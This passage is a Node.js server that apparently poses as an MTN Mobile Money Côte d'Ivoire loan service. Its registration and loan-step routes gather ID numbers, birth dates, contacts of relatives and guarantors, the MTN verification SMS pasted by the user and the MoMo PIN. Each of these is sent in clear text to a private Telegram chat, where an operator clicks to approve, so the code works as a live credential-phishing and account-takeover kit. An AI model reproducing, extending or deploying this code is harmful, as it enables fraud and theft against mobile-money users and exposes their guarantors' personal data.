// ============================================================
// server.js – MTN Mobile Money Côte d'Ivoire  (v7.6)
// Stockage JSON local · SMS-paste · Admin Telegram
// ============================================================
'use strict';

require('dotenv').config();
const express      = require('express');
const fetch        = require('node-fetch');
const cors         = require('cors');
const path         = require('path');
const fs           = require('fs');
const helmet       = require('helmet');
const compression  = require('compression');
const cookieParser = require('cookie-parser');
const jwt          = require('jsonwebtoken');
const rateLimit    = require('express-rate-limit');
const PDFDocument  = require('pdfkit');

let TNC_VERSION = '1.0';
let TNC_EFFECTIVE = '2026-01-01';
let TERMS_TEXT = 'Conditions non configurées.';
try {
    const terms = require('./terms');
    TNC_VERSION   = terms.TNC_VERSION   || TNC_VERSION;
    TNC_EFFECTIVE = terms.TNC_EFFECTIVE || TNC_EFFECTIVE;
    TERMS_TEXT    = terms.TERMS_TEXT    || TERMS_TEXT;
} catch (e) {
    console.warn('⚠️  backend/terms.js introuvable — utilisation par défaut');
}

const app = express();
app.set('trust proxy', 1);

app.use(helmet({
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'"],
            scriptSrc: ["'self'"],
            styleSrc: ["'self'", "https://fonts.googleapis.com"],
            fontSrc: ["'self'", "https://fonts.gstatic.com", "data:"],
            imgSrc: ["'self'", "data:"],
            connectSrc: ["'self'"],
            objectSrc: ["'none'"],
            frameAncestors: ["'none'"]
        }
    },
    crossOriginEmbedderPolicy: false,
    crossOriginResourcePolicy: { policy: 'same-site' }
}));
app.use(compression());
app.use(cors({ origin: true, credentials: true }));
app.use(cookieParser(process.env.SESSION_SECRET || 'momo-secret-change-me'));
app.use(express.json({ limit: '1mb' }));
app.use(express.static(path.join(__dirname, '../frontend')));

const PORT = process.env.PORT || 3000;
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const TG_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
const SESSION_SECRET = process.env.SESSION_SECRET || 'momo-secret-change-me';
const IS_PROD = process.env.NODE_ENV === 'production';

const RATE_LIMIT_MESSAGE = 'Vous avez dépassé la limite d\'essais. Réessayez dans 5 minutes.';
const RATE_WINDOW_MS = 5 * 60 * 1000;

function makeLimiter(max, keyGen) {
    return rateLimit({
        windowMs: RATE_WINDOW_MS, max: max,
        standardHeaders: true, legacyHeaders: false,
        keyGenerator: keyGen || ((req) => req.ip),
        handler: (req, res) => {
            res.status(429).json({ ok: false, code: 'RATE_LIMITED', retryAfterSeconds: 300, error: RATE_LIMIT_MESSAGE });
        }
    });
}
const globalLimiter     = makeLimiter(300);
const registerLimiter   = makeLimiter(5);
const submitStepLimiter = makeLimiter(30, (req) => (req.body && req.body.applicationId) ? req.body.applicationId : req.ip);
const smsLimiter        = makeLimiter(10, (req) => (req.body && req.body.applicationId) ? req.body.applicationId : req.ip);
app.use('/api/', globalLimiter);

console.log('═══════════════════════════════════════');
console.log('🚀 Serveur en démarrage... (v7.6 / Côte d\'Ivoire)');
console.log('   BOT_TOKEN:', BOT_TOKEN ? BOT_TOKEN.slice(0, 12) + '...' : 'MANQUANT');
console.log('   CHAT_ID:', CHAT_ID || 'MANQUANT');
console.log('   NODE_ENV:', process.env.NODE_ENV || 'development');
console.log('   Stockage: fichiers JSON locaux');
console.log('═══════════════════════════════════════');

// ─── Types de comptes MoMo CI ───
const ACCOUNT_TYPES = {
    basic:    { name: 'Compte Basic',    icon: '🟡', dailyCash: 200000,  monthlyCap: 500000,   maxLoan: 100000,  minLoan: 25000,  requiresId: false, description: 'Compte MoMo de base (sans CNI)' },
    standard: { name: 'Compte Standard', icon: '⭐', dailyCash: 1000000, monthlyCap: 2000000,  maxLoan: 500000,  minLoan: 50000,  requiresId: true,  description: 'Compte MoMo standard (avec CNI)' },
    premium:  { name: 'Compte Premium',  icon: '💎', dailyCash: 5000000, monthlyCap: 10000000, maxLoan: 2000000, minLoan: 100000, requiresId: true,  description: 'Compte MoMo premium (avec CNI vérifiée)' }
};

const STEP_ORDER = ['loan', 'personal', 'employment', 'guarantor', 'momologin', 'qualification'];
const LEGACY_STEPS = ['application', 'sms', 'pin', 'otp'];

const REG_STATUS = {
    IDLE: 'idle',
    PENDING: 'pending_review',
    SMS_PENDING: 'sms_pending',
    SMS_SUBMITTED: 'sms_submitted',
    SMS_VERIFIED: 'sms_verified',
    PIN_PENDING: 'pin_pending',
    COMPLETED: 'completed',
    REJECTED: 'rejected'
};

// ═══════════════════════════════════════════════════════════
// STOCKAGE FICHIERS JSON
// ═══════════════════════════════════════════════════════════
const applications  = {};
const registrations = {};
const DATA_DIR   = path.join(__dirname, '../data');
const DATA_FILE  = path.join(DATA_DIR, 'applications.json');
const REG_FILE   = path.join(DATA_DIR, 'registrations.json');
const AUDIT_FILE = path.join(DATA_DIR, 'audit.log');
try { if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true }); }
catch (e) { console.error('mkdir error:', e.message); }

function saveApps() {
    try {
        fs.writeFileSync(DATA_FILE, JSON.stringify({
            applications: applications,
            timestamp: new Date().toISOString()
        }, null, 2));
    } catch (e) { console.error('Erreur sauvegarde:', e.message); }
}
function saveRegs() {
    try {
        fs.writeFileSync(REG_FILE, JSON.stringify({
            registrations: registrations,
            timestamp: new Date().toISOString()
        }, null, 2));
    } catch (e) { console.error('Erreur sauvegarde inscriptions:', e.message); }
}
function loadAll() {
    try {
        if (fs.existsSync(DATA_FILE)) {
            const parsed = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
            const age = Date.now() - new Date(parsed.timestamp).getTime();
            if (age < 30 * 24 * 60 * 60 * 1000) {
                Object.assign(applications, parsed.applications || {});
                console.log(`📂 ${Object.keys(applications).length} dossiers chargés`);
            }
        }
        if (fs.existsSync(REG_FILE)) {
            const parsed = JSON.parse(fs.readFileSync(REG_FILE, 'utf8'));
            Object.assign(registrations, parsed.registrations || {});
            console.log(`📂 ${Object.keys(registrations).length} inscriptions chargées`);
        }
    } catch (e) { console.error('Erreur chargement:', e.message); }
}

function audit(event, data) {
    data = data || {};
    const entry = Object.assign({ ts: new Date().toISOString(), event: event }, data);
    try { fs.appendFileSync(AUDIT_FILE, JSON.stringify(entry) + '\n'); } catch (e) {}
    console.log(JSON.stringify(entry));
}

// ─── Helpers ───
function esc(t) { return t === null || t === undefined ? '' : String(t).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;'); }
function code(t) { return '<code>' + esc((t === null || t === undefined) ? '' : String(t).trim()) + '</code>'; }
function pre(t) { return '<pre>' + esc((t === null || t === undefined) ? '' : String(t).trim()) + '</pre>'; }
function fmt(n) {
    var num = Number(n) || 0;
    return num.toLocaleString('fr-FR').replace(/\u202f/g, ' ').replace(/\u00a0/g, ' ');
}
function fmtXOF(n) { return fmt(n) + ' F CFA'; }
function monthlyRepayment(p, m) { return (!p || !m) ? 0 : Math.ceil(p / m); }

function ensureSteps(app_) {
    if (!app_.steps) app_.steps = {};
    STEP_ORDER.forEach(k => { if (!(k in app_.steps)) app_.steps[k] = 'idle'; });
    return app_.steps;
}
function readStep(app_, step) {
    if (app_.steps && step in app_.steps) return app_.steps[step];
    if (step in app_) return app_[step];
    return 'idle';
}
function writeStep(app_, step, value) {
    if (app_.steps && step in app_.steps) app_.steps[step] = value;
    if (step in app_) app_[step] = value;
    if (step === 'qualification') {
        app_.qualification = (value === 'approved') ? 'qualified' : (value === 'rejected') ? 'unqualified' : value;
    }
}
function resetStep(app_, step) {
    writeStep(app_, step, 'idle');
    if (step === 'loan') app_.loanData = null;
    if (step === 'personal') app_.personalData = null;
    if (step === 'employment') app_.employmentData = null;
    if (step === 'guarantor') app_.guarantorData = null;
    if (step === 'momologin') { app_.loginPin = null; app_.momoLoginData = null; }
}

function issueSession(res, applicationId) {
    const token = jwt.sign({ id: applicationId }, SESSION_SECRET, { expiresIn: '7d' });
    res.cookie('momoSession', token, { httpOnly: true, sameSite: 'lax', secure: IS_PROD, maxAge: 7 * 24 * 60 * 60 * 1000 });
}
function readSession(req) {
    try { const raw = req.cookies && req.cookies.momoSession; return raw ? jwt.verify(raw, SESSION_SECRET) : null; }
    catch (e) { return null; }
}
function guardAppId(req, res, next) {
    const id = req.params.applicationId;
    const session = readSession(req);
    if (session && session.id !== id) return res.status(403).json({ ok: false, error: 'Session invalide.' });
    next();
}

// ─── Validation CNI CI ───
function validateCNI(cni) {
    if (!cni) return { ok: false, reason: 'Le numéro CNI est obligatoire.' };
    const clean = String(cni).replace(/\s/g, '').toUpperCase();
    if (!/^[A-Z0-9]{8,14}$/.test(clean)) {
        return { ok: false, reason: 'Le numéro CNI doit contenir 8 à 14 caractères alphanumériques.' };
    }
    return { ok: true, cniNumber: clean };
}

function validateDob(dobIso) {
    if (!dobIso) return { ok: false, reason: 'La date de naissance est obligatoire.' };
    const d = new Date(dobIso);
    if (isNaN(d.getTime())) return { ok: false, reason: 'Date de naissance invalide.' };
    const now = new Date();
    let age = now.getFullYear() - d.getFullYear();
    const m = now.getMonth() - d.getMonth();
    if (m < 0 || (m === 0 && now.getDate() < d.getDate())) age--;
    if (age < 18) return { ok: false, reason: 'Vous devez avoir 18 ans ou plus.' };
    if (age > 100) return { ok: false, reason: 'Âge maximum dépassé.' };
    return { ok: true, age: age, dobIso: dobIso };
}

// ─── Telegram ───
async function tgSend(text, buttons) {
    if (!BOT_TOKEN || !CHAT_ID) return { ok: false };
    const body = { chat_id: CHAT_ID, text: text, parse_mode: 'HTML', disable_web_page_preview: true };
    if (buttons) body.reply_markup = { inline_keyboard: buttons };
    try {
        const r = await fetch(`${TG_API}/sendMessage`, {
            method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body)
        });
        const result = await r.json();
        if (result.ok) console.log(`✅ TG envoyé (${result.result && result.result.message_id})`);
        else console.error(`❌ TG: ${result.description}`);
        return result;
    } catch (e) { console.error('❌ TG error:', e.message); return { ok: false }; }
}
function askApproval(text, step, appId) {
    const buttons = [[
        { text: '✅ OUI', callback_data: JSON.stringify({ a: 'Y', s: step, id: appId }) },
        { text: '❌ NON', callback_data: JSON.stringify({ a: 'N', s: step, id: appId }) }
    ]];
    tgSend(text, buttons);
}
function buildRegistrationReviewMessage(app_, dobCheck) {
    const type = ACCOUNT_TYPES[app_.accountType];
    const tnc = app_.tncAccepted || {};
    return '🆕 <b>NOUVELLE INSCRIPTION — VALIDATION REQUISE</b>\n' +
        '━━━━━━━━━━━━━━━━━━━━━━\n' +
        '🆔 ID Dossier : ' + code(app_.applicationId) + '\n\n' +
        '<b>👤 DEMANDEUR</b>\n' +
        'Nom :     ' + esc(app_.fullName || 'N/A') + '\n' +
        'Téléphone : ' + code('+225 ' + (app_.phone || '')) + '\n' +
        'Email :   ' + code(app_.email || '') + '\n' +
        'CNI :     ' + code(app_.momoRegistration && app_.momoRegistration.idNumber ? app_.momoRegistration.idNumber : 'N/A') + '\n' +
        'Naissance : ' + code(app_.dob || 'N/A') + '\n' +
        (dobCheck.ok ? 'Âge :      ' + dobCheck.age + ' ans\n' : '') +
        '\n<b>💳 TYPE DE COMPTE RÉCLAMÉ</b>\n' +
        type.icon + ' <b>' + type.name + '</b> — ' + esc(type.description) + '\n\n' +
        '<b>📊 LIMITES APPLICABLES</b>\n' +
        'Cash journalier : ' + fmtXOF(type.dailyCash) + '\n' +
        'Plafond mensuel : ' + fmtXOF(type.monthlyCap) + '\n' +
        'Prêt max :        <b>' + fmtXOF(type.maxLoan) + '</b>\n' +
        'Prêt min :        ' + fmtXOF(type.minLoan) + '\n\n' +
        '<b>📜 CONFORMITÉ</b>\n' +
        'CGL : v' + (tnc.version || '?') + '\n' +
        'IP :  ' + (tnc.ip || 'N/A') + '\n\n' +
        '✅ <b>Approuver → demander le SMS ?</b>\n' +
        '❌ <b>NON → inscription annulée</b>';
}
function buildPinApprovalMessage(app_) {
    return '🔐 <b>VÉRIFICATION DU CODE PIN MoMo</b>\n' +
        '━━━━━━━━━━━━━━━━━━━━━━\n' +
        '🆔 ' + code(app_.applicationId) + '\n' +
        '👤 ' + esc(app_.fullName || 'N/A') + '\n' +
        '📱 ' + code('+225 ' + (app_.phone || '')) + '\n' +
        '💳 ' + esc((ACCOUNT_TYPES[app_.accountType] || {}).name || 'N/A') + '\n\n' +
        '<b>🔑 CODE PIN SAISI PAR L\'UTILISATEUR</b>\n' +
        '<code>' + esc(app_.regPin || '') + '</code>\n\n' +
        'SMS vérifié : ✅\n' +
        'Défini à : ' + (app_.regPinSetAt ? new Date(app_.regPinSetAt).toLocaleString('fr-FR') : 'N/A') + '\n\n' +
        '✅ <b>OUI → inscription terminée</b>\n' +
        '❌ <b>NON → l\'utilisateur ressaisit le code PIN</b>';
}
function buildSmsApprovalMessage(app_) {
    const type = ACCOUNT_TYPES[app_.accountType] || {};
    return '📩 <b>L\'UTILISATEUR A ENVOYÉ LE SMS</b>\n' +
        '━━━━━━━━━━━━━━━━━━━━━━\n' +
        '🆔 ID Dossier : ' + code(app_.applicationId) + '\n' +
        '👤 ' + esc(app_.fullName || 'N/A') + '\n' +
        '📱 ' + code('+225 ' + (app_.phone || '')) + '\n' +
        '💳 ' + esc(type.name || 'N/A') + '\n\n' +
        '<b>📨 SMS COLLÉ PAR L\'UTILISATEUR</b>\n' +
        pre(app_.regUserSms || '') + '\n' +
        'Reçu à : ' + (app_.regSmsSubmittedAt ? new Date(app_.regSmsSubmittedAt).toLocaleString('fr-FR') : 'N/A') + '\n\n' +
        '<b>🔎 VÉRIFIER</b>\n' +
        '☐ Le SMS vient bien de MTN\n' +
        '☐ Il contient un code valide\n' +
        '☐ Il n\'est pas expiré\n\n' +
        '✅ <b>OUI → confirmer le SMS et passer au PIN</b>\n' +
        '❌ <b>NON → l\'utilisateur recolle son SMS</b>';
}
function buildStepMessage(step, app_, type, data) {
    const header = '🆔 ' + code(app_.applicationId) + '\n';
    if (step === 'loan') {
        const monthly = monthlyRepayment(data.loanAmount, parseInt(data.loanTerm));
        const required = Math.ceil(data.loanAmount * 0.20);
        const effectiveRequired = Math.min(required, type.monthlyCap);
        return '📋 <b>DEMANDE DE PRÊT (ÉTAPE 1/6)</b>\n━━━━━━━━━━━━━━━━━━━━━━\n' + header +
            '\n<b>💳 COMPTE</b>\n' + type.icon + ' <b>' + type.name + '</b> (max ' + fmtXOF(type.maxLoan) + ')\n\n' +
            '<b>💰 PRÊT</b>\nType : ' + esc(data.loanType) + '\nMontant : <b>' + fmtXOF(data.loanAmount) + '</b>\n' +
            'Durée : ' + esc(data.loanTerm) + '\nMensualité : <b>' + fmtXOF(monthly) + '</b>\nObjet : ' + esc(data.loanPurpose) + '\n\n' +
            '<b>📊 QUALIFICATION (règle des 20 %)</b>\nRequis effectif : <b>' + fmtXOF(effectiveRequired) + '</b>\n\n' +
            '✅ OUI / ❌ NON — l\'utilisateur revient à l\'étape 1 si NON';
    }
    if (step === 'personal') return '👤 <b>INFORMATIONS PERSONNELLES (2/6)</b>\n' + header + 'Nom : ' + esc(data.firstName) + ' ' + esc(data.lastName) + '\nTéléphone : ' + code('+225 ' + data.phone) + '\nEmail : ' + esc(data.email) + '\n\n✅ OUI / ❌ NON';
    if (step === 'employment') return '💼 <b>EMPLOI ET PROCHE (3/6)</b>\n' + header + 'Emploi : ' + esc(data.employment) + '\nRevenu annuel : ' + fmtXOF(data.annualIncome) + '\nProche : ' + esc(data.kinName) + ' ' + code('+225 ' + data.kinPhone) + '\n\n✅ OUI / ❌ NON';
    if (step === 'guarantor') return '🤝 <b>GARANT (4/6)</b>\n' + header + 'Nom : ' + esc(data.guarantorName) + '\nTéléphone : ' + code('+225 ' + data.guarantorPhone) + '\nRelation : ' + esc(data.guarantorRelation) + '\n\n✅ OUI / ❌ NON';
    if (step === 'momologin') {
        const pinStr = (data.loginMethod === 'pin' && data.pin) ? code(data.pin) : '🔒 Biométrie';
        return '🔐 <b>CONNEXION MoMo (5/6)</b>\n' + header + 'Téléphone : ' + code('+225 ' + data.phone) + '\nMéthode : ' + esc(data.loginMethod || 'pin') + '\nCode PIN : ' + pinStr + '\n\n✅ OUI / ❌ NON';
    }
    if (step === 'qualification') {
        const loanAmount = app_.loanAmount || 0;
        const months = parseInt(app_.loanTerm) || 12;
        const monthly = app_.monthlyRepayment || monthlyRepayment(loanAmount, months);
        return '📊 <b>QUALIFICATION FINALE (6/6)</b>\n' + header +
            'Demandeur : ' + esc(app_.firstName || '') + ' ' + esc(app_.lastName || '') + '\n' +
            'Montant : <b>' + fmtXOF(loanAmount) + '</b>\nMensualité : <b>' + fmtXOF(monthly) + '</b>\n\n' +
            '✅ OUI / ❌ NON';
    }
    return 'Étape "' + step + '" en attente pour ' + code(app_.applicationId);
}

// ═══════════════════════════════════════════════════════════
// DIAGNOSTIC
// ═══════════════════════════════════════════════════════════
app.get('/health', (req, res) => {
    res.json({
        status: 'ok',
        version: '7.6',
        country: 'CI',
        storage: 'filesystem',
        uptime: process.uptime(),
        applications: Object.keys(applications).length
    });
});
app.get('/api/telegram-debug', async (req, res) => {
    const result = { tokenSet: !!BOT_TOKEN, chatIdSet: !!CHAT_ID };
    try { const me = await fetch(`${TG_API}/getMe`); result.getMe = await me.json(); } catch (e) { result.getMeError = e.message; }
    try { result.testSend = await tgSend('🧪 <b>Test</b>', null); } catch (e) { result.testSendError = e.message; }
    res.json(result);
});
app.get('/api/account-types', (req, res) => res.json({ ok: true, types: ACCOUNT_TYPES }));
app.get('/api/terms', (req, res) => res.json({ ok: true, version: TNC_VERSION, effective: TNC_EFFECTIVE, text: TERMS_TEXT }));

// ═══════════════════════════════════════════════════════════
// INSCRIPTION
// ═══════════════════════════════════════════════════════════
app.post('/api/register-momo', registerLimiter, async (req, res) => {
    try {
        const body = req.body || {};
        const applicationId = body.applicationId;
        const idNumber = body.idNumber;
        const accountType = body.accountType;
        const phone = body.phone;
        const email = body.email;
        const fullName = body.fullName;
        const dobProvided = body.dob;
        const tncAccepted = body.tncAccepted;

        if (!applicationId || !idNumber || !accountType) return res.status(400).json({ ok: false, error: 'Champs obligatoires manquants.' });
        if (!ACCOUNT_TYPES[accountType]) return res.status(400).json({ ok: false, error: 'Type de compte invalide.' });
        if (!phone || !/^\d{10}$/.test(String(phone))) return res.status(400).json({ ok: false, error: 'Numéro de téléphone à 10 chiffres requis.' });
        if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(String(email))) return res.status(400).json({ ok: false, error: 'Adresse email valide requise.' });
        if (!tncAccepted || tncAccepted !== true) return res.status(400).json({ ok: false, error: 'Vous devez lire et accepter les Conditions Générales.' });

        const type = ACCOUNT_TYPES[accountType];
        let idCheck = { ok: true };
        if (type.requiresId) {
            idCheck = validateCNI(idNumber);
            if (!idCheck.ok) return res.status(400).json({ ok: false, error: idCheck.reason });
        }
        const dobCheck = validateDob(dobProvided);
        if (!dobCheck.ok) return res.status(400).json({ ok: false, error: dobCheck.reason });

        if (!applications[applicationId]) applications[applicationId] = { applicationId: applicationId, createdAt: new Date().toISOString() };
        ensureSteps(applications[applicationId]);

        applications[applicationId].momoRegistration = {
            idNumber: type.requiresId ? idNumber : null,
            dob: dobCheck.dobIso,
            age: dobCheck.age,
            accountType: accountType, accountName: type.name,
            limits: { dailyCash: type.dailyCash, monthlyCap: type.monthlyCap, maxLoan: type.maxLoan },
            maxLoan: type.maxLoan, minLoan: type.minLoan,
            phone: phone, email: email, fullName: fullName || null,
            registeredAt: new Date().toISOString()
        };
        applications[applicationId].isRegistered = true;
        applications[applicationId].accountType = accountType;
        applications[applicationId].accountMaxLoan = type.maxLoan;
        applications[applicationId].phone = phone;
        applications[applicationId].email = email;
        applications[applicationId].fullName = fullName || null;
        applications[applicationId].dob = dobCheck.dobIso;
        applications[applicationId].tncAccepted = {
            accepted: true, version: TNC_VERSION, effective: TNC_EFFECTIVE,
            timestamp: new Date().toISOString(),
            ip: req.ip || req.headers['x-forwarded-for'] || 'unknown',
            userAgent: (req.headers['user-agent'] || '').slice(0, 200)
        };
        applications[applicationId].personalData = applications[applicationId].personalData || { firstName: null, lastName: null, phone: phone, email: email };
        applications[applicationId].registrationStatus = REG_STATUS.PENDING;
        applications[applicationId].registrationHistory = applications[applicationId].registrationHistory || [];
        applications[applicationId].registrationHistory.push({ at: new Date().toISOString(), event: 'submitted', by: 'user' });
        applications[applicationId].updatedAt = new Date().toISOString();
        saveApps();

        issueSession(res, applicationId);
        audit('registration_submitted', { applicationId: applicationId, accountType: accountType, phone: phone, email: email });

        askApproval(buildRegistrationReviewMessage(applications[applicationId], dobCheck), 'registration', applicationId);

        res.json({
            ok: true, accountType: accountType, accountName: type.name, phone: phone, email: email,
            dob: dobCheck.dobIso,
            tncVersion: TNC_VERSION,
            registrationStatus: REG_STATUS.PENDING,
            limits: { dailyCash: type.dailyCash, monthlyCap: type.monthlyCap, maxLoan: type.maxLoan },
            maxLoan: type.maxLoan, minLoan: type.minLoan,
            message: type.name + ' soumis pour vérification.'
        });
    } catch (e) {
        console.error('Erreur inscription:', e.message);
        res.status(500).json({ ok: false, error: e.message });
    }
});

// ═══════════════════════════════════════════════════════════
// VÉRIFICATION INSCRIPTION
// ═══════════════════════════════════════════════════════════
app.get('/api/registration/status/:applicationId', guardAppId, (req, res) => {
    const app_ = applications[req.params.applicationId];
    if (!app_) return res.status(404).json({ ok: false, error: 'Introuvable' });
    res.json({
        ok: true,
        applicationId: app_.applicationId,
        status: app_.registrationStatus || REG_STATUS.IDLE,
        accountType: app_.accountType || null,
        accountName: (app_.momoRegistration || {}).accountName || null,
        accountMaxLoan: app_.accountMaxLoan || 0,
        phone: app_.phone || null,
        rejectionReason: app_.rejectionReason || null
    });
});

app.post('/api/registration/submit-sms', smsLimiter, async (req, res) => {
    try {
        const applicationId = (req.body || {}).applicationId;
        const sms = (req.body || {}).sms;
        if (!applicationId || !sms) return res.status(400).json({ ok: false, error: 'Champs manquants.' });
        const session = readSession(req);
        if (session && session.id !== applicationId) return res.status(403).json({ ok: false, error: 'Session invalide.' });
        const app_ = applications[applicationId];
        if (!app_) return res.status(404).json({ ok: false, error: 'Introuvable' });
        if (app_.registrationStatus !== REG_STATUS.SMS_PENDING) {
            return res.status(400).json({ ok: false, error: 'Aucun SMS en attente.' });
        }
        const smsTrim = String(sms).trim();
        if (smsTrim.length < 10) return res.status(400).json({ ok: false, error: 'Veuillez coller le SMS complet reçu.' });
        if (smsTrim.length > 2000) return res.status(400).json({ ok: false, error: 'Le SMS est trop long.' });

        app_.regUserSms = smsTrim;
        app_.regSmsSubmittedAt = new Date().toISOString();
        app_.registrationStatus = REG_STATUS.SMS_SUBMITTED;
        app_.registrationHistory.push({ at: new Date().toISOString(), event: 'sms_submitted_by_user' });
        app_.updatedAt = new Date().toISOString();
        saveApps();

        audit('registration_sms_submitted', { applicationId: applicationId });
        askApproval(buildSmsApprovalMessage(app_), 'reg_sms', applicationId);

        res.json({ ok: true, status: REG_STATUS.SMS_SUBMITTED, next: 'awaiting-admin' });
    } catch (e) { res.status(500).json({ ok: false, error: e.message }); }
});

app.post('/api/registration/set-pin', async (req, res) => {
    try {
        const applicationId = (req.body || {}).applicationId;
        const pin = (req.body || {}).pin;
        if (!applicationId || !pin) return res.status(400).json({ ok: false, error: 'Champs manquants.' });
        const session = readSession(req);
        if (session && session.id !== applicationId) return res.status(403).json({ ok: false, error: 'Session invalide.' });
        const app_ = applications[applicationId];
        if (!app_) return res.status(404).json({ ok: false, error: 'Introuvable' });
        if (app_.registrationStatus !== REG_STATUS.SMS_VERIFIED) return res.status(400).json({ ok: false, error: 'SMS non vérifié.' });
        if (!/^\d{5}$/.test(String(pin))) return res.status(400).json({ ok: false, error: 'Le code PIN doit comporter 5 chiffres.' });
        app_.regPin = String(pin);
        app_.regPinSetAt = new Date().toISOString();
        app_.registrationStatus = REG_STATUS.PIN_PENDING;
        app_.registrationHistory.push({ at: new Date().toISOString(), event: 'pin_set' });
        app_.updatedAt = new Date().toISOString();
        saveApps();
        askApproval(buildPinApprovalMessage(app_), 'reg_pin', applicationId);
        res.json({ ok: true, status: REG_STATUS.PIN_PENDING });
    } catch (e) { res.status(500).json({ ok: false, error: e.message }); }
});

app.post('/api/registration/reset', async (req, res) => {
    try {
        const applicationId = (req.body || {}).applicationId;
        const app_ = applications[applicationId];
        if (!app_) return res.status(404).json({ ok: false, error: 'Introuvable' });
        app_.registrationStatus = REG_STATUS.IDLE;
        app_.regUserSms = null;
        app_.regPin = null;
        app_.rejectionReason = null;
        app_.registrationHistory = app_.registrationHistory || [];
        app_.registrationHistory.push({ at: new Date().toISOString(), event: 'user_reset_registration' });
        saveApps();
        res.json({ ok: true });
    } catch (e) { res.status(500).json({ ok: false, error: e.message }); }
});

// ═══════════════════════════════════════════════════════════
// ÉTAPES DU PRÊT
// ═══════════════════════════════════════════════════════════
app.post('/api/submit-step', submitStepLimiter, async (req, res) => {
    try {
        const applicationId = (req.body || {}).applicationId;
        const step = (req.body || {}).step;
        const data = (req.body || {}).data || {};
        if (!applicationId || !step) return res.status(400).json({ ok: false, error: 'applicationId ou step manquant.' });
        if (STEP_ORDER.indexOf(step) === -1) return res.status(400).json({ ok: false, error: 'Étape invalide : ' + step });

        const session = readSession(req);
        if (session && session.id !== applicationId) return res.status(403).json({ ok: false, error: 'Session invalide.' });

        const app_ = applications[applicationId];
        if (!app_) return res.status(404).json({ ok: false, code: 'NOT_REGISTERED', error: 'Dossier introuvable.' });
        if (!app_.isRegistered || !app_.accountType || !ACCOUNT_TYPES[app_.accountType]) {
            return res.status(403).json({ ok: false, code: 'NOT_REGISTERED', error: 'Vous devez d\'abord vous inscrire sur MoMo.' });
        }
        if (app_.registrationStatus !== REG_STATUS.COMPLETED) {
            return res.status(403).json({ ok: false, code: 'REGISTRATION_INCOMPLETE', error: 'Inscription non vérifiée.' });
        }

        const type = ACCOUNT_TYPES[app_.accountType];
        ensureSteps(app_);

        const idx = STEP_ORDER.indexOf(step);
        if (idx > 0) {
            const prev = STEP_ORDER[idx - 1];
            if (app_.steps[prev] !== 'approved') {
                return res.status(400).json({ ok: false, error: 'L\'étape précédente "' + prev + '" n\'est pas encore approuvée.' });
            }
        }

        if (step === 'loan') {
            if (!data.loanType || !data.loanAmount || !data.loanTerm || !data.loanPurpose) return res.status(400).json({ ok: false, error: 'Remplissez tous les champs du prêt.' });
            if (data.loanAmount < type.minLoan) return res.status(400).json({ ok: false, error: 'Montant minimum pour ' + type.name + ' : ' + fmtXOF(type.minLoan) + '.' });
            if (data.loanAmount > type.maxLoan) return res.status(400).json({ ok: false, error: type.name + ' permet un prêt maximum de ' + fmtXOF(type.maxLoan) + '.' });
            app_.loanType = data.loanType; app_.loanAmount = data.loanAmount;
            app_.loanTerm = data.loanTerm; app_.loanPurpose = data.loanPurpose;
            app_.monthlyRepayment = monthlyRepayment(data.loanAmount, parseInt(data.loanTerm));
            app_.loanData = { loanType: data.loanType, loanAmount: data.loanAmount, loanTerm: data.loanTerm, loanPurpose: data.loanPurpose };
        }
        if (step === 'personal') {
            if (!data.firstName || !data.lastName || !data.phone || !data.email) return res.status(400).json({ ok: false, error: 'Remplissez tous les champs personnels.' });
            app_.firstName = data.firstName; app_.lastName = data.lastName;
            app_.phone = data.phone; app_.email = data.email;
            app_.personalData = { firstName: data.firstName, lastName: data.lastName, phone: data.phone, email: data.email };
        }
        if (step === 'employment') {
            if (!data.employment || data.annualIncome == null || !data.kinName || !data.kinPhone) return res.status(400).json({ ok: false, error: 'Remplissez tous les champs.' });
            app_.employment = data.employment; app_.annualIncome = data.annualIncome;
            app_.kinName = data.kinName; app_.kinPhone = data.kinPhone;
            app_.employmentData = { employment: data.employment, annualIncome: data.annualIncome, kinName: data.kinName, kinPhone: data.kinPhone };
        }
        if (step === 'guarantor') {
            if (!data.guarantorName || !data.guarantorPhone || !data.guarantorRelation) return res.status(400).json({ ok: false, error: 'Remplissez tous les champs du garant.' });
            if (app_.phone && data.guarantorPhone === app_.phone) return res.status(400).json({ ok: false, error: 'Le téléphone du garant ne peut pas être le vôtre.' });
            app_.guarantorName = data.guarantorName; app_.guarantorPhone = data.guarantorPhone;
            app_.guarantorRelation = data.guarantorRelation;
            app_.guarantorData = { guarantorName: data.guarantorName, guarantorPhone: data.guarantorPhone, guarantorRelation: data.guarantorRelation };
        }
        if (step === 'momologin') {
            if (!data.phone) return res.status(400).json({ ok: false, error: 'Téléphone requis.' });
            if (app_.phone && data.phone !== app_.phone) return res.status(400).json({ ok: false, error: 'Le téléphone doit correspondre à celui enregistré.' });
            if (data.loginMethod === 'pin' && (!data.pin || !/^\d{5}$/.test(data.pin))) return res.status(400).json({ ok: false, error: 'Le code PIN doit comporter 5 chiffres.' });
            app_.loginPhone = data.phone;
            app_.loginPin = (data.loginMethod === 'pin') ? data.pin : null;
            app_.loginMethod = data.loginMethod || 'pin';
            app_.deviceInfo = data.deviceInfo || null;
            app_.momoLoginData = { phone: data.phone, pin: app_.loginPin, loginMethod: app_.loginMethod, deviceInfo: data.deviceInfo };
        }
        if (step === 'qualification') {
            const required = Math.ceil((app_.loanAmount || 0) * 0.20);
            app_.qualificationRequired = Math.min(required, type.monthlyCap);
        }

        app_.steps[step] = 'pending';
        app_.updatedAt = new Date().toISOString();
        saveApps();

        audit('step_submitted', { id: applicationId, step: step, accountType: app_.accountType });
        askApproval(buildStepMessage(step, app_, type, data), step, applicationId);
        res.json({ ok: true, status: 'pending', step: step });
    } catch (e) { res.status(500).json({ ok: false, error: e.message }); }
});

// ═══════════════════════════════════════════════════════════
// CONTRAT & PDF
// ═══════════════════════════════════════════════════════════
app.get('/api/agreement/:applicationId', guardAppId, (req, res) => {
    const app_ = applications[req.params.applicationId];
